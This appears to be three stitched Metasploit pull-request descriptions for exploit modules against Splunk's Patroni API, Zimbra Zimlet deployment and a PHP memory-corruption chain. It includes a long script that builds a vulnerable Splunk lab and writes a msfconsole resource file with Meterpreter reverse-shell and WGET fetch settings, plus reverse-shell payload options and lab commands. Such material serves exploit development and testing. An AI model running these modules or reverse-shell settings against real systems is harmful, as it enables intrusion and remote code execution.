3a:T8ebe,## Description

This module uses unauthenticated access to the Patroni REST API to configure PostgreSQL's archive_command and restart the addressed primary member. A completed Write Ahead Log (WAL) segment then invokes the payload as the PostgreSQL operating system user. This is asynchronous and requires database activity. 

Splunk's advisory lists Enterprise 10.2.0 through 10.2.6 and 10.4.0 through 10.4.2, with the PostgreSQL sidecar enabled on a search head cluster. Fixed releases are 10.2.7 and 10.4.3. The API does not expose the Splunk version; check establishes unauthenticated configuration access, not this CVE or RCE. 

Exploitation changes cluster-wide configuration and restarts PostgreSQL. Use an isolated, authorized cluster. The module refuses an existing archive command/library and attempts to restore the original dynamic settings, including absent values, on cleanup.

## Verification

1. Deploy an isolated affected cluster, enable its sidecar, and verify the API is reachable.
1. Start `msfconsole` from this checkout.
1. Do: `use exploit/linux/http/splunk_patroni_unauth_rce`.
1. Set `RHOSTS`, `RPORT`, `TARGETURI`, and `SSL` for the primary Patroni API.
1. Leave `HTTP::Auth` set to `none`; HTTP username and password options are deregistered.
1. Do: `check`. Unauthenticated configuration access should return `Appears`, not `Vulnerable`.
1. Select a compatible command payload and set its required callback/delivery options.
1. Do: `options`, then `run verbose=true`.
1. Verify actual execution through a usable session
1. Verify the recovery message, compare dynamic settings to their originals, and inspect all members for pending restarts.
1. Run again immediately to verify recovery permits a second execution.

### Setup 

The documentation has a detailed set of instructions on how to configure a vulnerable lab. MacOS users can run the following chonker of a python script to stand up the lab using a single command:

<details>
<summary>setup_splunk_patroni_lab.py</summary>
<p>

```python
#!/usr/bin/env python3
"""Create a local, intentionally vulnerable Splunk 10.2.5 lab on Docker Desktop.

Run: python3 tools/dev/setup_splunk_patroni_lab.py --accept-terms
Requires Python 3.9+, macOS, Docker Desktop/Compose, and >=12 GiB Docker RAM.
Apple Silicon runs the pinned linux/amd64 image under emulation.

This is a three-member search head cluster, not a standalone Patroni substitute.
No authentication settings or vendor binaries are patched. Published services bind
only to Mac loopback; the ordinary bridge network allows container-to-Mac callbacks.
The script does not run the exploit, delete containers/volumes, or change firewalls.

Sources:
  https://advisory.splunk.com/advisories/SVD-2026-1001
  https://splunk.github.io/docker-splunk/ADVANCED.html
  https://docs.docker.com/desktop/features/networking/networking-how-tos/
"""

import argparse
import base64
import concurrent.futures
import hashlib
import http.client
import json
import os
from pathlib import Path
import platform
import re
import secrets
import shlex
import shutil
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse


IMAGE = "splunk/splunk@sha256:44c887d30001030fa500da7bfb0ad573ff9bde8e3901882e183bfbd242b9e569"
KIND = "msf-splunk-patroni-76268-macos-v1"
MEMBERS = ("sh1", "sh2", "sh3")
CPUS_PER_MEMBER = 4
# Each tuple is (container port, first Mac port); subsequent members add 1.
PORTS = {
    "Patroni HTTP": (8008, 28008),
    "Splunk Web HTTP": (8000, 28000),
    "Splunk management HTTPS": (8089, 28089),
    "PostgreSQL": (5432, 25432),
    "SHC replication": (9887, 29887),
}
STATE_FILE = ".lab-state.json"


class LabError(Exception):
    """An actionable setup or verification failure."""


class CommandTimeout(LabError):
    """A bounded command timed out while the target might still be starting."""


def host_port(service, member):
    return PORTS[service][1] + MEMBERS.index(member)


def compose_config(password):
    services = {}
    volumes = {}
    for member in MEMBERS:
        volumes.update({f"{member}-etc": {}, f"{member}-var": {}})
        services[member] = {
            "image": IMAGE,
            "platform": "linux/amd64",
            "hostname": member,
            "restart": "no",
            "mem_limit": "3g",
            # Two-CPU caps starved etcd/sidecar health checks during live testing.
            "cpus": CPUS_PER_MEMBER,
            "environment": {
                "SPLUNK_START_ARGS": "--accept-license",
                "SPLUNK_GENERAL_TERMS": "--accept-sgt-current-at-splunk-com",
                "SPLUNK_PASSWORD": password,
                "SPLUNK_ROLE": "splunk_standalone",
            },
            "volumes": [
                "./default.yml:/tmp/defaults/default.yml:ro",
                f"{member}-etc:/opt/splunk/etc",
                f"{member}-var:/opt/splunk/var",
            ],
            "ports": [
                f"127.0.0.1:{host_port(service, member)}:{ports[0]}"
                for service, ports in PORTS.items()
            ],
            "logging": {
                "driver": "json-file",
                "options": {"max-size": "20m", "max-file": "3"},
            },
        }
    # Do NOT use internal:true: that lab configuration blocked reverse callbacks.
    return {"services": services, "volumes": volumes,
            "networks": {"default": {"driver": "bridge", "internal": False}}}


def run(command, *, check=True, timeout=120, stream=False):
    try:
        result = subprocess.run(command, capture_output=not stream, text=True, timeout=timeout)
    except subprocess.TimeoutExpired as error:
        raise CommandTimeout(f"Timed out running {command[0]}; target processes may still be starting") from error
    if check and result.returncode:
        # Do not echo command arguments: Splunk CLI arguments can contain lab secrets.
        display = list(command)
        detail = ((result.stdout or "") + (result.stderr or "")).strip()
        for index, argument in enumerate(command[:-1]):
            if argument in ("-auth", "-secret"):
                secret = command[index + 1]
                detail = detail.replace(secret, "[REDACTED]")
                if argument == "-auth":
                    detail = detail.replace(secret.partition(":")[2], "[REDACTED]")
                display[index + 1] = "[REDACTED]"
        raise LabError(f"Command failed (exit {result.returncode}): {shlex.join(display)}\n"
                       f"{detail or 'See the Docker/Splunk logs for details'}")
    return result


def wait_for(description, predicate, timeout):
    deadline = time.monotonic() + timeout
    delay = 1.0
    detail = "Not ready"
    print(f"[*] Waiting for {description} (up to {timeout}s)", flush=True)
    while True:
        ready, detail = predicate()
        if ready:
            return
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise LabError(f"Timed out waiting for {description}: {detail}")
        time.sleep(min(delay, remaining))
        delay = min(delay * 1.5, 10)


def request(member, service, path, *, password=None, changes=None, fields=None):
    port = host_port(service, member)
    if service == "Splunk management HTTPS":
        # These disposable Splunk instances generate self-signed certificates.
        connection = http.client.HTTPSConnection(
            "127.0.0.1", port, timeout=5, context=ssl._create_unverified_context())
    else:
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    headers = {}
    if password is not None:
        token = base64.b64encode(f"admin:{password}".encode()).decode()
        headers["Authorization"] = f"Basic {token}"
    body = None
    if changes is not None:
        headers["Content-Type"] = "application/json"
        body = json.dumps(changes)
    if fields is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = urllib.parse.urlencode(fields)
    try:
        method = "POST" if fields is not None else "PATCH" if changes is not None else "GET"
        connection.request(method, path, body, headers)
        response = connection.getresponse()
        content = response.read(2 * 1024 * 1024)
        status = response.status
    finally:
        connection.close()
    # Never print /config bodies: they contain generated database credentials.
    # Splunk's properties API acknowledges form updates with XML, not JSON.
    document = json.loads(content) if status == 200 and fields is None else None
    if status == 200 and fields is None and not isinstance(document, dict):
        raise LabError(f"{member} {path} returned HTTP 200 but not a JSON object")
    return status, document


def save_state(directory, state):
    path = directory / STATE_FILE
    path.write_text(json.dumps(state, indent=2) + "\n")
    path.chmod(0o600)


def prepare(directory):
    if directory.exists() and directory.is_symlink():
        raise LabError("Refusing a symlink as the lab directory")
    state_path = directory / STATE_FILE
    if state_path.exists():
        if state_path.is_symlink():
            raise LabError("Refusing a symlink as the lab state file")
        state = json.loads(state_path.read_text())
        if not isinstance(state, dict) or state.get("kind") != KIND or state.get("image") != IMAGE:
            raise LabError("Existing directory is not this script's pinned lab; choose --directory")
        required = ("project", "password", "cluster_secret", "initialized", "restarted", "bootstrapped")
        if any(key not in state for key in required):
            raise LabError("The lab state file is incomplete; inspect it before resuming")
        return state
    if directory.exists() and any(directory.iterdir()):
        raise LabError("Refusing to overwrite a nonempty directory without this lab's state file")
    directory.mkdir(parents=True, exist_ok=True, mode=0o700)
    state = {
        "kind": KIND, "image": IMAGE,
        "project": "msf-splunk-76268-" + hashlib.sha256(str(directory).encode()).hexdigest()[:8],
        "password": "Aa1!" + secrets.token_hex(16),
        "cluster_secret": secrets.token_hex(24),
        "initialized": [], "restarted": False, "bootstrapped": False,
    }
    save_state(directory, state)
    return state


def write_input(path, content, mode=0o600):
    if path.exists():
        if path.is_symlink() or path.read_text() != content:
            raise LabError(f"Refusing to overwrite changed input: {path}")
        path.chmod(mode)
        return
    with path.open("x") as output:
        output.write(content)
    path.chmod(mode)


def write_defaults(directory):
    # The image's set_config_file.yml DELETES the named file before rendering
    # these stanzas on every container start. Never point it at system/local:
    # that would erase CLI-created clustering settings after a Docker restart.
    legacy = (
        "---\nsplunk:\n  conf:\n    - key: server\n      value:\n        content:\n"
        "          postgres:\n            disabled: 'false'\n          ipc_broker:\n"
        f"            postgres:patroni:address: {PORTS['Patroni HTTP'][0]}\n"
    )
    content = legacy.replace(
        "      value:\n", "      value:\n        directory: /opt/splunk/etc/apps/msf_patroni_lab/local\n")
    path = directory / "default.yml"
    # Migrate only the exact prior generated input; preserve operator edits.
    if path.exists() and not path.is_symlink() and path.read_text() == legacy:
        path.write_text(content)
    write_input(path, content, mode=0o644)


def previous_cluster_id(compose):
    identities = []
    for member in MEMBERS:
        result = run(compose + ["exec", "-T", "-u", "splunk", member, "grep", "flavorSent",
                                "/opt/splunk/var/log/splunk/sup-pkg-nascent-stdout.log"], check=False)
        identity = None
        for line in result.stdout.splitlines():
            try:
                event = json.loads(line)
                identity = json.loads(event["flavorSent"])["SearchHeadClusterID"]
            except (json.JSONDecodeError, KeyError, TypeError):
                continue
        if not isinstance(identity, str) or not re.fullmatch(r"[0-9A-Fa-f-]{36}", identity):
            raise LabError(f"Cannot recover the original cluster ID from {member}; inspect its preserved nascent logs before reinitializing")
        identities.append(identity)
    if len(set(identities)) != 1:
        raise LabError("Preserved members disagree about the original cluster ID; refusing to overwrite their identities")
    return identities[0]


def preflight():
    if platform.system() != "Darwin":
        raise LabError("Run this script on the Mac itself, using local Docker Desktop")
    if not shutil.which("docker"):
        raise LabError("Install and start Docker Desktop first")
    run(["docker", "compose", "version"])
    info = run(["docker", "info", "--format", "{{.OperatingSystem}}|{{.OSType}}|{{.MemTotal}}"]).stdout.strip()
    if len(info.split("|")) != 3:
        raise LabError("Docker returned unexpected engine information; verify Docker Desktop is running")
    operating_system, engine_type, memory = info.split("|")
    endpoint = os.environ.get("DOCKER_HOST") or run(
        ["docker", "context", "inspect", "--format", "{{.Endpoints.docker.Host}}"]
    ).stdout.strip()
    if "Docker Desktop" not in operating_system or engine_type != "linux" or not endpoint.startswith("unix://"):
        raise LabError("Select your local Docker Desktop Linux context, not a remote Docker engine")
    if int(memory) < 12 * 1024 ** 3:
        raise LabError("Allocate at least 12 GiB RAM to Docker Desktop for the three Splunk members")
    print("[*] Allow tens of GB of Docker disk space; the image and three installations are large", flush=True)
    if platform.machine() == "arm64":
        print("[*] Apple Silicon: using linux/amd64 emulation; initial startup may be slow", flush=True)


def verify_callback(compose, port):
    print(f"[*] Testing all members -> Mac TCP {port} through host.docker.internal", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        try:
            listener.bind(("0.0.0.0", port))
        except OSError as error:
            raise LabError(f"Cannot reserve Mac port {port}; choose another --callback-port/--fetch-port or stop your own conflicting listener") from error
        listener.listen(3)
        listener.settimeout(10)
        addresses = []
        for member in MEMBERS:
            marker = secrets.token_hex(24)
            # Bundled Python performs only a TCP canary, not a shell or exploit.
            probe = (
                "import json,socket,sys; "
                "address=socket.gethostbyname('host.docker.internal'); "
                "connection=socket.create_connection((address,int(sys.argv[1])),5); "
                "connection.sendall(sys.argv[2].encode()); connection.close(); "
                "print(json.dumps({'address':address}))"
            )
            result = run(compose + ["exec", "-T", "-u", "splunk", member,
                                    "/opt/splunk/bin/python3", "-c", probe, str(port), marker],
                         check=False, timeout=20)
            if result.returncode:
                raise LabError(f"Callback from {member} failed. Check Mac firewall/VPN/Docker host DNS; no firewall settings were changed")
            connection, _peer = listener.accept()
            with connection:
                connection.settimeout(5)
                received = b""
                while len(received) < len(marker):
                    chunk = connection.recv(len(marker) - len(received))
                    if not chunk:
                        break
                    received += chunk
            if received != marker.encode():
                raise LabError(f"Callback canary mismatch from {member}; do not assume reachability")
            addresses.append(json.loads(result.stdout)["address"])
            print(f"[+] {member} connected to the Mac on TCP {port}", flush=True)
        if len(set(addresses)) != 1:
            raise LabError("Members resolved different Mac addresses; inspect Docker DNS before choosing LHOST")
        return addresses[0]


def setup(args):
    os.umask(0o077)
    preflight()
    directory = args.directory.expanduser().absolute()
    state = prepare(directory)
    compose = ["docker", "compose", "--project-directory", str(directory),
               "--project-name", state["project"], "--file", str(directory / "compose.json")]
    compose_path = directory / "compose.json"
    compose_content = json.dumps(compose_config(state["password"]), indent=2) + "\n"
    legacy_compose = compose_content.replace(f'"cpus": {CPUS_PER_MEMBER}', '"cpus": 2')
    if compose_path.exists() and not compose_path.is_symlink() and compose_path.read_text() == legacy_compose:
        compose_path.write_text(compose_content)
    write_input(compose_path, compose_content)
    # The unprivileged image user must read this bind-mounted, non-secret file.
    # Compose and credential/state files remain private to the Mac user (0600).
    write_defaults(directory)
    run(compose + ["config", "--quiet"])
    owners = run(["docker", "ps", "-a", "--filter", f"label=com.docker.compose.project={state['project']}",
                  "--format", '{{.Label "com.docker.compose.project.working_dir"}}']).stdout.splitlines()
    if any(Path(owner) != directory for owner in owners):
        raise LabError("Compose project belongs to another directory; refusing to touch it")
    print(f"[*] Lab directory: {directory}", flush=True)
    if run(["docker", "image", "inspect", IMAGE], check=False).returncode:
        print("[*] Pulling the exact previously verified Splunk 10.2.5 amd64 image", flush=True)
        run(compose + ["pull"], timeout=3600, stream=True)
    run(compose + ["up", "--detach", "--no-recreate", "--pull", "never"], timeout=300, stream=True)
    # --no-recreate preserves existing installations; update just their CPU
    # allowance in place when migrating the old two-CPU recipe.
    for container in run(compose + ["ps", "--all", "--quiet"]).stdout.splitlines():
        quota = run(["docker", "inspect", "--format", "{{.HostConfig.NanoCpus}}", container]).stdout.strip()
        if int(quota) != CPUS_PER_MEMBER * 10 ** 9:
            run(["docker", "update", "--cpus", str(CPUS_PER_MEMBER), container])

    def management_ready():
        for member in MEMBERS:
            try:
                status, document = request(member, "Splunk management HTTPS",
                                           "/services/server/info?output_mode=json", password=state["password"])
                if status != 200:
                    return False, f"{member} management HTTP {status}"
                version = document["entry"][0]["content"]["version"]
                if version != "10.2.5":
                    raise LabError(f"Unexpected Splunk version on {member}: {version}")
            except (OSError, http.client.HTTPException, json.JSONDecodeError, KeyError, IndexError) as error:
                return False, f"{member} management: {error}"
        return True, "All management APIs ready on Splunk 10.2.5"

    wait_for("the three initial Splunk management APIs", management_ready, args.timeout)
    for member in MEMBERS:
        # Phase flags are only hints: old image startup automation could have
        # erased clustering configuration since the previous successful setup.
        configured = run(compose + ["exec", "-T", "-u", "splunk", member,
                                   "/opt/splunk/bin/splunk", "btool", "server", "list", "shclustering"])
        if not re.search(r"^\s*disabled\s*=\s*(?:false|0)\s*$", configured.stdout, re.MULTILINE):
            if state["bootstrapped"] and not state.get("cluster_id"):
                # Reinitializing without this ID creates a different SHC while
                # the preserved etcd credentials/data belong to the old one.
                state["cluster_id"] = previous_cluster_id(compose)
            if member in state["initialized"]:
                print(f"[*] Repairing missing search head cluster configuration on {member}", flush=True)
                state["initialized"].remove(member)
            state["restarted"] = False
            state["bootstrapped"] = False
            save_state(directory, state)
        if member not in state["initialized"]:
            print(f"[*] Initializing search head clustering on {member}", flush=True)
            run(compose + ["exec", "-T", "-u", "splunk", member, "/opt/splunk/bin/splunk",
                           "init", "shcluster-config", "-auth", f"admin:{state['password']}",
                           "-mgmt_uri", f"https://{member}:{PORTS['Splunk management HTTPS'][0]}",
                           "-replication_port", str(PORTS["SHC replication"][0]),
                           "-replication_factor", "3", "-secret", state["cluster_secret"],
                           "-shcluster_label", state["project"]])
            state["initialized"].append(member)
            save_state(directory, state)
    if not state["restarted"]:
        if state.get("cluster_id"):
            for member in MEMBERS:
                status, _document = request(member, "Splunk management HTTPS",
                                            "/services/properties/server/shclustering/id",
                                            password=state["password"], fields={"value": state["cluster_id"]})
                if status != 200:
                    raise LabError(f"Restoring the original cluster ID on {member} returned HTTP {status}")
        print("[*] Restarting the three newly configured Splunk members in parallel", flush=True)
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(run, compose + ["exec", "-T", "-u", "splunk", member,
                                                       "/opt/splunk/bin/splunk", "restart"], timeout=600)
                       for member in MEMBERS]
            for future in futures:
                future.result()
        state["restarted"] = True
        save_state(directory, state)
    wait_for("management after the cluster restarts", management_ready, args.timeout)
    cli = compose + ["exec", "-T", "-u", "splunk", "sh1", "/opt/splunk/bin/splunk"]
    auth = ["-auth", f"admin:{state['password']}"]
    if not state["bootstrapped"]:
        # A prior bootstrap may have committed before an interrupted script saved state.
        current = run(cli + ["show", "shcluster-status"] + auth, check=False, timeout=30)
        captain_exists = current.returncode == 0 and re.search(r"\belected_captain\s*:", current.stdout)
        if not captain_exists:
            print("[*] Bootstrapping the search head cluster captain", flush=True)
            run(cli + ["bootstrap", "shcluster-captain", "-servers_list",
                       ",".join(f"https://{member}:{PORTS['Splunk management HTTPS'][0]}" for member in MEMBERS)] + auth)
        state["bootstrapped"] = True
        save_state(directory, state)

    def cluster_ready():
        try:
            result = run(cli + ["show", "shcluster-status"] + auth, check=False, timeout=90)
        except CommandTimeout:
            return False, "Cluster status command timed out while Splunk was starting"
        output = result.stdout
        ready = (result.returncode == 0 and re.search(r"initialized_flag\s*:\s*1\b", output)
                 and re.search(r"service_ready_flag\s*:\s*1\b", output)
                 and len(re.findall(r"\bstatus\s*:\s*Up\b", output)) == len(MEMBERS))
        if ready:
            identity = re.search(r"^\s*id\s*:\s*([0-9A-Fa-f-]{36})\s*$", output, re.MULTILINE)
            if not identity:
                return False, "Captain did not report the cluster ID"
            if state.get("cluster_id") and state["cluster_id"] != identity[1]:
                raise LabError("Running cluster ID differs from the preserved identity; refusing to treat a replacement cluster as recovered")
            state["cluster_id"] = identity[1]
            save_state(directory, state)
        return bool(ready), "Captain must be initialized/service ready with all three members Up"

    wait_for("a fully initialized three-member search head cluster", cluster_ready, args.timeout)
    primary = []

    def patroni_ready():
        primary.clear()
        for member in MEMBERS:
            try:
                status, document = request(member, "Patroni HTTP", "/patroni")
                if status != 200 or document.get("state") != "running":
                    return False, f"{member} Patroni/PostgreSQL not yet running"
                if document.get("pending_restart"):
                    return False, f"{member} has a pending restart; inspect it before exploitation"
                if document.get("role") in ("master", "primary"):
                    primary.append(member)
                status, config = request(member, "Patroni HTTP", "/config")
                if status in (401, 403):
                    raise LabError(f"{member} /config requires authentication; this is not the expected 10.2.5 fixture. Authentication will NOT be disabled")
                if status != 200 or not isinstance(config, dict):
                    return False, f"{member} /config HTTP {status}"
                postgres = config.get("postgresql")
                if not isinstance(postgres, dict) or not isinstance(postgres.get("parameters"), dict):
                    return False, f"{member} has no dynamic PostgreSQL parameters yet"
                for service in PORTS:
                    if service == "Patroni HTTP":
                        continue
                    with socket.create_connection(("127.0.0.1", host_port(service, member)), timeout=3):
                        pass
            except (OSError, http.client.HTTPException, json.JSONDecodeError) as error:
                return False, f"{member} service readiness: {error}"
        return len(primary) == 1, "Exactly one running PostgreSQL primary is required"

    wait_for("all Patroni/PostgreSQL members and published database/replication ports", patroni_ready, args.timeout)
    primary_member = primary[0]
    status, _document = request(primary_member, "Patroni HTTP", "/config",
                                changes={"postgresql": {"parameters": {}}})
    if status != 200:
        raise LabError(f"Primary unauthenticated no-op PATCH /config returned HTTP {status}, not 200")
    print("[+] All three unauthenticated GET /config requests returned HTTP 200", flush=True)
    print("[+] Primary unauthenticated nested no-op PATCH /config returned HTTP 200", flush=True)
    callback = verify_callback(compose, args.callback_port)
    fetch_address = verify_callback(compose, args.fetch_port)
    if fetch_address != callback:
        raise LabError("Callback and fetch probes resolved different Mac addresses")
    resource = directory / "msfconsole.rc"
    resource.write_text(
        "use exploit/linux/http/splunk_patroni_unauth_rce\n"
        f"set RHOSTS 127.0.0.1\nset RPORT {host_port('Patroni HTTP', primary_member)}\n"
        "set SSL false\nset PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp\nset FETCH_COMMAND WGET\n"
        f"set LHOST {callback}\nset LPORT {args.callback_port}\n"
        "set ReverseListenerBindAddress 0.0.0.0\n"
        f"set FETCH_SRVHOST {callback}\nset FETCH_SRVPORT {args.fetch_port}\n"
        "set FetchListenerBindAddress 0.0.0.0\n"
        "set FETCH_WRITABLE_DIR /tmp\nset FETCH_DELETE true\noptions\ncheck\n"
        "# Exploitation is intentionally manual: run -j verbose=true\n"
        "# Interact with sessions -i <id>; verify getuid and sysinfo.\n"
    )
    resource.chmod(0o600)
    print("\n[+] Lab ready. All addresses below are on your Mac (no tunnels).")
    print(f"{'Service':<27} {'sh1':<9} {'sh2':<9} {'sh3':<9}")
    for service in PORTS:
        print(f"{service:<27} " + " ".join(f"{host_port(service, member):<9}" for member in MEMBERS))
    print(f"\n[+] Current primary: {primary_member}; target http://127.0.0.1:{host_port('Patroni HTTP', primary_member)}")
    print(f"[+] Callback LHOST={callback}, LPORT={args.callback_port}, ReverseListenerBindAddress=0.0.0.0")
    print(f"[+] Payload HTTP server: {callback}:{args.fetch_port}, FetchListenerBindAddress=0.0.0.0")
    print(f"[+] Splunk Web user: admin; generated password is in {directory / STATE_FILE} (mode 600)")
    print(f"[+] From your Framework checkout: bundle exec ./msfconsole -r {shlex.quote(str(resource))}")
    print("[!] The resource checks access only. Run exploitation manually: run -j verbose=true")
    print("[!] Interact with sessions -i <id>. The fetch payload backgrounds execution so archiving can finish.")
    print("[!] Exploitation changes cluster-wide WAL settings; commands may run on multiple members.")
    print("[!] Inspect all members for pending restarts after exploitation. An idle database may need benign activity.")
    print(f"[*] Stop without deleting anything: {shlex.join(compose + ['stop'])}")
    print(f"[*] Restart preserved lab: {shlex.join(compose + ['up', '--detach', '--no-recreate', '--pull', 'never'])}")
    print("[*] Rerun this script to rediscover the primary and regenerate callback settings; it preserves this lab.")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--accept-terms", action="store_true",
                        help="Accept Splunk's license/general terms for this disposable lab")
    parser.add_argument("--directory", type=Path,
                        default=Path.home() / "test_targets" / "splunk_patroni_76268_macos")
    parser.add_argument("--timeout", type=int, default=1800, help="Readiness timeout per phase in seconds (default: 1800)")
    parser.add_argument("--callback-port", type=int, default=4444, help="Reserve/test this Mac callback port (default: 4444)")
    parser.add_argument("--fetch-port", type=int, default=8081, help="Reserve/test this Mac payload HTTP port (default: 8081)")
    parser.add_argument("--dry-run", action="store_true", help="Print Compose JSON only; create/start/change nothing")
    args = parser.parse_args()
    if args.timeout <= 0 or any(not 1024 <= port <= 65535 for port in (args.callback_port, args.fetch_port)):
        parser.error("Use a positive --timeout and callback/fetch ports between 1024 and 65535")
    published_ports = {ports[1] + index for ports in PORTS.values() for index in range(len(MEMBERS))}
    if args.callback_port == args.fetch_port or any(port in published_ports for port in (args.callback_port, args.fetch_port)):
        parser.error("Callback/fetch ports must be distinct and must not overlap published Splunk/Patroni ports")
    if args.dry_run:
        print(json.dumps(compose_config("DryRunOnly-Aa1!"), indent=2))
        return 0
    if not args.accept_terms:
        parser.error("Pass --accept-terms only if you accept Splunk's license/general terms; no containers have been started")
    try:
        setup(args)
    except (LabError, OSError, ValueError) as error:
        print(f"[!] Setup failed: {error}", file=sys.stderr)
        print("[!] Existing containers, volumes and configuration were preserved. Inspect the lab; rerun to resume.", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n[!] Interrupted; containers and volumes were preserved. Rerun to resume.", file=sys.stderr)
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

<details>
<summary>One-command setup on macOS</summary>
<p>

For Docker Desktop on the Mac running Metasploit, use the self-contained
setup_splunk_patroni_lab.py

```bash
python3 setup_splunk_patroni_lab.py --accept-terms
```

Pass `--accept-terms` only if you accept Splunk's license and general terms. The
script requires Python 3.9+, a local Docker Desktop Linux engine with Compose, at
least 12 GiB of Docker RAM, and tens of GB of Docker disk space. It pins the same
unmodified amd64 10.2.5 image used in the successful lab; Apple Silicon uses amd64
emulation and can take longer. Three search head members are created, not a
standalone substitute for the vulnerable Splunk deployment. Each member has a 3 
GiB memory limit and a four-CPU allowance. Allow adequate Docker CPU capacity and
avoid starting the lab under heavy host load or you're going to have a bad time. 

All published services bind to `127.0.0.1` on the Mac; no Ubuntu VM, SSH tunnel,
host route, or LAN exposure is required:

| Service | sh1 | sh2 | sh3 |
| --- | --- | --- | --- |
| Patroni HTTP | 28008 | 28009 | 28010 |
| Splunk Web HTTP | 28000 | 28001 | 28002 |
| Splunk management HTTPS | 28089 | 28090 | 28091 |
| PostgreSQL | 25432 | 25433 | 25434 |
| Search head replication | 29887 | 29888 | 29889 |

The script initializes the cluster, waits for all members to be ready, verifies
unauthenticated `/config` reads and a valid no-op write return HTTP 200, discovers
the current primary, and checks all published TCP ports. Splunk login/database
authentication is separate from the unauthenticated Patroni vulnerability; it is
not disabled. HEC and indexing inputs are not needed or enabled by this recipe.

An ordinary Docker bridge network permits callbacks. The script tests every
member's TCP connection to the Mac using Docker Desktop's documented
[`host.docker.internal` address][docker-desktop-networking]. It temporarily reserves
Mac TCP ports 4444 and 8081 for harmless canaries; use `--callback-port` and
`--fetch-port` if either port is busy.
This canary, and the generated reverse-handler settings, bind `0.0.0.0` so Docker
can reach them; the vulnerable application ports remain loopback-only. 


The script preserves its containers and volumes, can resume its recorded setup,
and prints stop/restart commands. Rerun it to refresh the primary and callback
settings after an election or Docker networking change. It also repairs missing
search head cluster settings left by the earlier setup recipe. Its generated
`default.yml` uses a dedicated app directory: the image's startup automation
replaces the configured file, so targeting `etc/system/local/server.conf` would
erase CLI-created clustering settings on every container start. Use `--dry-run` to inspect
the generated Compose configuration without creating or starting anything. The
same pinned image has also produced a verified Meterpreter session as `splunk`
on Docker Desktop for macOS using the generated WGET fetch configuration. Rerun
the setup checks on your own instance; neither container health alone nor an
open TCP port establishes that Patroni is ready.

</p>
</details>

```3b:Tcf9,## Description

This adds an exploit module for Zimbra's administrator-authorized `DeployZimletRequest` operation when server-side Zimlet JSP execution is enabled. The module requires valid global-administrator credentials, generates a unique Zimlet containing the selected Framework JSP payload, deploys it, verifies that the JSP was processed, and returns a session as the `zimbra` service account.

The module randomizes its package and resource names. Its JSP has a one-shot access gate, and cleanup undeploys the package and verifies that both its LDAP registration and deployed resource are gone. Static JSP delivery is detected and rejected without reporting code execution.

Zimbra documents the relevant server-side JSP feature and disables it by default. This behavior is configuration-dependent and has no CVE assigned - [technical analysis](https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/ZIMBRA-ADMINRCE.md).

OpenAI Codex assisted with implementation, fixture design, and review. A second AI model performed read-only source reviews. The final positive and negative paths described below were executed manually.

## Setup and Reproduction

The included module documentation describes the required configuration and complete reproduction procedure. In summary:

```text

set RHOSTS <target>
set USERNAME <global administrator>
set PASSWORD <password>
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <listener address>
check
run
```

3d:T24b4,Related issue: #22034

> **Draft:** opened for early maintainer feedback on the module and the
> `STAGER_TARGET_DIR` staging design. GitHub Actions will run the framework

## Description

Adds an exploit module for the PHP2Shell vulnerabilities
`CVE-2026-109618` / `CVE-2026-109619` (pre-authentication PHP core memory
corruption leading to `zif_system` execution).

- Module: `exploit/multi/http/php2shell`
- References: #22034 (open suggestion-module issue)
- The module performs the complete published HTTP chain: worker rotation,
  heap leak, libphp leak, forged Zend structures and `system()` execution.
- `check` compares `X-Powered-By` against the published affected ranges and
  includes a descriptive reason string; `Msf::Exploit::Remote::AutoCheck` is
  prepended.

The 167-byte carrier carries at most 14 command bytes, so the module delivers
`payload.encoded` by writing it to `STAGER_DIR` (a host directory bind-mounted
into the target at `STAGER_TARGET_DIR`, default `/tmp/s`; the public PoC lab
convention `/out` also works) and triggering it with
`bash<STAGER_TARGET_DIR/STAGER_NAME`. I would appreciate maintainer feedback on whether this staged
payload approach is acceptable for an exploit module, or whether the companion
auxiliary command-execution module should be submitted instead.

## Setup and Reproduction

Target: official `php:8.4.26-apache` image, `linux/amd64`, configured with the
published PoC lab settings (`display_errors=On`, `memory_limit=8M`,
`post_max_size=64M`, `upload_max_filesize=64M`, upload progress enabled,
`session.use_strict_mode=0`) and a single Apache prefork worker with
`KeepAlive Off`. The target must have a host directory bind-mounted at `/tmp/s`
(the module default; `STAGER_TARGET_DIR` can change it).

```bash
docker network create p2s-lab
docker run -d --name php2shell-target --platform linux/amd64 --network p2s-lab \
  -v /path/to/php.ini:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro \
  -v /path/to/apache.conf:/etc/apache2/conf-enabled/zz-php2shell.conf:ro \
  -v /path/to/www:/var/www/html:ro \
  -v /path/to/stager:/tmp/s \
  --entrypoint /bin/sh \
  php:8.4.26-apache \
  -c 'chown -R www-data:www-data /tmp/s 2>/dev/null || true; exec apache2-foreground'
```

## Verification

- [x] Run `check` against PHP 8.4.26 and confirm
      `The target appears to be vulnerable. PHP 8.4.26 ...`.
- [x] Run `check` against PHP 8.4.27 and confirm
      `The target is not exploitable. PHP 8.4.27 ...`.
- [x] Run `exploit` against PHP 8.4.26 and confirm a command shell session.
- [x] Upgrade the session with `sessions -u <id>` and confirm a Meterpreter
      session; `sysinfo` and `getuid` return `www-data`.
- [x] Confirm `rubocop` with the repository configuration reports no offenses.
- [ ] Run `msftidy` and the pre-commit hook inside a full upstream clone.
- [ ] Run `msftidy_docs.rb` against the module documentation inside the clone.
- [ ] Reproduce on a second independent target/worker setup (optional; currently
      tested against the published single-worker lab only).

Additional SAPI/worker tests against real targets:

| Target configuration | Result |
|---|---|
| Apache prefork, 1 worker, PHP 8.4.26 (reference) | `check` Appears; shell + Meterpreter session |
| PHP-FPM, 1 worker, PHP 8.4.26 | `check` Appears; exploit fails at heap-leak stage |
